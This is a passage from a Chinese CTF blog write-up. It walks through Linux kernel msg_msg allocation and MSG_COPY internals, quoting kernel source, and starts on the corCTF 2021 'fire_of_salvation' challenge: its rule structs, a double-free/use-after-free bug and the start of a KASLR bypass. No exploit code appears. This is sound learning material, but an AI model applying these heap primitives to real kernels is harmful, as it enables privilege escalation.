class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		<span class="comment">/* no one is waiting for this message, enqueue it */</span></span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages);</span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数首先对msgtype和msgsz进行了检查，然后调用<code>load_msg(mtext, msgsz)</code>来初始化<code>msg_msg</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会先调用<code>alloc_msg</code>来请求msg_msg结构体所需要的空间.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个函数可以看出msg结构体是可以扩充的，可以从<code>0x40</code>扩充到<code>0x1000</code>,这也是为什么msg_msg利用的范围这么广了。</p>
<p>而且当消息长度超过了<code>0x1000-0x30</code>还可以吧消息进行分段，最多分三段，结构图如下，所以一个消息的长度理论上最多是<code>0x3000-0x30-0x8-0x8</code></p>
<p><img src="https://img-blog.csdnimg.cn/3fcc181ebcc04b70b425a27f57ac166b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnJlZXplT19v,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>函数申请完所有空间就返回到<code>load_msg</code>函数。</p>
<p>然后<code>load_msg</code>把用户空间的消息全部复制到刚申请的msg_msg和msg_msgseg上，就返回到<code>do_msgsnd</code>函数中，这个函数剩下的工作就是经过一堆检查然后把msg_msg链接到对应的消息队列中去，消息队列示意图如下。</p>
<p><img src="https://img-blog.csdnimg.cn/41f3e8fb8b054310ac6d3b18f6b13a4d.png#pic_center" alt="在这里插入图片描述"></p>
<h4 id="msgrcv"><a href="#msgrcv" class="headerlink" title="msgrcv()"></a>msgrcv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数msqid：指定消息队列id，由msgget 返回。<br>参数msgp：接收消息用的结构体指针<br>参数msgsz：接收消息用的结构体大小<br>参数msgtyp：三种情况：<br>=0 : 读取消息队列中第一个消息</p>
<p>0 : 读取消息队列中类型为msgtyp 的第一个消息，如果msgflg 设置了MSG_EXCEPT 则会读取非msgtyp类型的第一个消息， 这个消息类型在msgsnd 里用msgbuf 结构体指定的；如果msgflg 设置了MSG_COPY则会读取队列中的第msgtyp个消息。<br>&lt;0 : 读取消息队列中最小类型且小于等于msgtyp 绝对值的消息。<br>参数msgflg：通常使用下面的一些flag：<br>IPC_NOWAIT : 消息队列为空则不会阻塞。<br>MSG_EXCEPT : 跟上面msgtyp 联用，读取类型不是msgtyp 的第一条消息。<br>MSG_NOERROR : 消息长度超过msgsz 时截断消息。<br>MSG_COPY : 漏洞利用中会用到，内核会把消息队列中的消息拷贝一份返回用户空间而不会释放该条消息结构。<br>返回值：成功时返回读取的消息字节数，失败返回-1。</p>
</blockquote>
<p>内核会调用<code>do_msgrcv()</code>函数,这个函数就会根据msgtype和msgflg来搜索到msg,然后把这个msg拷贝到用户空间的<code>buf</code>处，当msgflg!=<code>MSG_COPY</code>的时候 ，找到msg后就会把这个msg从消息队列中unlink,然后把信息复制给用户空间，然后再free这个<code>msg</code>。</p>
<p>但是当msgflg=<code>MSG_COPY</code>的时候，会先申请一个新的msg,然后在消息队列中找到一个msg,然后把这个msg拷贝到新的msg中。然后再把新的msg的内容拷贝到用户态，最后释放新的<code>msg</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers);</span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not require due to ipc_lock_object() */</span></span><br><span class="line">		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not required, we own ipc_lock_object() */</span></span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 1:</span></span><br><span class="line"><span class="comment">		 * We don&#x27;t hold a reference to the queue and getting a</span></span><br><span class="line"><span class="comment">		 * reference would defeat the idea of a lockless operation,</span></span><br><span class="line"><span class="comment">		 * thus the code relies on rcu to guarantee the existence of</span></span><br><span class="line"><span class="comment">		 * msq:</span></span><br><span class="line"><span class="comment">		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.</span></span><br><span class="line"><span class="comment">		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 2:</span></span><br><span class="line"><span class="comment">		 * The work in pipelined_send() and expunge_all():</span></span><br><span class="line"><span class="comment">		 * - Set pointer to message</span></span><br><span class="line"><span class="comment">		 * - Queue the receiver task for later wakeup</span></span><br><span class="line"><span class="comment">		 * - Wake up the process after the lock is dropped.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Should the process wake up before this wakeup (due to a</span></span><br><span class="line"><span class="comment">		 * signal) it will either see the message and continue ...</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN)) &#123;</span><br><span class="line">			<span class="comment">/* see MSG_BARRIER for purpose/pairing */</span></span><br><span class="line">			smp_acquire__after_ctrl_dep();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 <span class="comment">/*</span></span><br><span class="line"><span class="comment">		  * ... or see -EAGAIN, acquire the lock to check the message</span></span><br><span class="line"><span class="comment">		  * again.</span></span><br><span class="line"><span class="comment">		  */</span></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="msg利用"><a href="#msg利用" class="headerlink" title="msg利用"></a>msg利用</h2><p>只要能控制了msg_msg后确实可以达到任意地址写和任意地址读，而且堆块范围是<code>0x40~0x1000</code>,感觉非常好用。</p>
<p>本文通过<code>corCTF 2021</code>两道内核题学习对msg_msg的利用。应该会很有难度，预计复现至少两天。(看完整个解题思路和长达400多行以及700多行的exp,🤦‍♀️坏了，不只是需要两天了。至少一周或者更久。。。</p>
<h3 id="fire-of-salvation"><a href="#fire-of-salvation" class="headerlink" title="fire_of_salvation"></a>fire_of_salvation</h3><p>题目给了源代码十分好审计，主要结构体如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">rule_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>漏洞出现在了dup()函数下，在全局指针数组中可以存储两次指向同一个堆块的指针，这导致可以释放两次同一个堆块，既可以doublefree又可以uaf.</p>
<h4 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h4><p>令人感叹，距离写下上一段话到现在已经过了半个月了，确实懒狗了这下，本来想着学完mit6.s081后再继续学习二进制的，但是肝了一周了有点肝不动了，前面还好说，后面的课确实沾点难度了，一个半小时的课我得看三个小时才能啃下来，想起了<code>msg</code>还没学完，那就换个东西折磨我吧。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>由于开启了kaslr和fg_kaslr,所以肯定得先获取内核地址，但是注意由于开启了<code>fg_kaslr</code>之后就没有那么简单了，<code>fg_kaslr</code>会在<code>kaslr</code>上以函数粒度对地址再进一步打乱，这个打乱也是随机的，所以函数到内核基地址的偏移是随时发现变化的，但是<code>fg_kaslr</code>有些区域不会被打乱</p>
<blockquote>
<p>1..text段</p>
<p>2.data段</p>
<p>3.__ksymtab</p>
